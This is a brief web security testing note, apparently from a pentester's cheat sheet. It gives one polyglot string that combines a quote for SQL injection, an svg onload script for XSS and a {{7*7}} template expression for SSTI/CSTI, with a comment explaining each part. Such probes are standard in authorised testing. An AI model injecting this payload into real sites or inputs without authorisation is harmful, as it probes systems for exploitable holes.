# To test XSS + SQLi + SSTI/CSTI with the same payload use : 

'"><svg/onload=prompt(5);>{{7*7}}

# ' ==> for Sql injection 
# "><svg/onload=prompt(5);> ==> for XSS 
# {{7*7}} ==> for SSTI/CSTI
